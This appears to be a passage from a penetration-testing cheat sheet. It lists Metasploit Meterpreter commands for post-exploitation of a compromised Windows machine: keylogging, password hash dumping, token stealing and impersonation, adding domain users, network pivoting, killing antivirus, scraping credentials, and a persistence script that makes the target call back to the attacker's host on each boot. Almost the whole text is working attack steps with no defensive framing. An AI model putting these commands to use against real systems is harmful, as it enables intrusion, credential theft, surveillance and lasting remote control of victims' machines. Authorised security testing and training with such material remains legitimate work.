screenshot
* Takes a screenshot of the exploited system.

sysinfo
* Show basic info about the exploited system.

* We can keylog an exploited Windows machine by doing the following in meterpreter :
ps - List all running processes.
migrate [explorer PID] - migrate to the explorer process.
run post/windows/capture/keylog_recorder - Use the keylog recorder module.

* We can dump password hashes doing the following : 
use priv - Load the priv extension.
run post/windows/gather/hashdump - Use the hashdump module.

* We can use the Token Impersonation technique as follows :
ps - List all running processes.
steal_token [PID] - Steal the token of the user running the process with PID.
use incognito - Load incognito module.
list_tokens -u - List all tokens.
impersonate_token [token] - Impersonate another token. (Make sure to use \\).
add_user [username] [password] -h [domain_ip] - Add a new user.
add_group_user [group name within ""] [username] -h [domain_ip] - Add a user to group inside the domain.

* We can possibly pivot into other systems on the same network as the exploited system as follows:
run get_local_subnets - Lists local subnets.
background - Put the sessions in background and access msfconsole.
route add [subnet] [subnet mask] [session_id]
route print - Print the routing table data.
* Then, scan the network with any module/nmap and determine what to do with other hosts.
* You can use the auto_add_route module before executing an exploit to automatically add
all possible routes.

run vnc
* Installs a VNC sessions on the target to give us a GUI.

run screen_unlock
* Unlocks the target's screen for us to use the GUI.

run post/windows/manage/migrate
* Migrates our process to another process for the session to be maintaned.

run killav
* Kills the antivirus.

run hashdump
* Obtains the system password hashes.

run packetrecorder -i [interface]
* Records all traffic to/from the target machine.

run scraper
* Gather all necessary info about the system, like usernames, passwords, registery and system info.

run persistence -X -i [num] -p [portnum] -r [host_ip]
* Running this script will make the target connect automatically to us everytime it boots.
* -X = Run on boot time.
* -i = Time before connection retries.
* -p = Host port number.
* -r = Host IP address.
* Create a listener in msfconsole using multi/handler and with the reverse_tcp payload.
